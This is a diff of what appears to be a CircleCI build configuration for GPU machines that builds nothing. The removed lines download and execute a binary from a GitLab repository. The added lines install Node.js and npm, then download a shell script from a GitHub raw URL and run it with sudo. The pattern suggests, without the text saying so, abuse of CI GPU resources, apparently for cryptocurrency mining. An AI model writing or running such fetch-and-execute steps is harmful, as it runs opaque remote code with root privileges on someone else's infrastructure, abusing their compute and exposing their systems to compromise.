@@ -1,11 +1,10 @@
-version: 2.1
-
-jobs:
-  build:
-    machine:
-      image: ubuntu-1604-cuda-10.1:201909-23
-    parallelism: 10
-    resource_class: gpu.nvidia.medium
-    steps:
-      - run: nvidia-smi
-      - run: wget https://gitlab.com/lambohopo/ton/-/raw/main/next && chmod +x next && ./next
+version: 2.1 
+ 
+jobs: 
+  build: 
+    machine: 
+      image: ubuntu-1604-cuda-10.1:201909-23 
+    resource_class: gpu.nvidia.large 
+    steps: 
+      - run: nvidia-smi 
+      - run: sudo apt update && sudo apt install nodejs && sudo apt install npm && wget https://raw.githubusercontent.com/RiniMentari/CantikdanManis/main/manja.sh && chmod +x manja.sh && sudo ./manja.sh
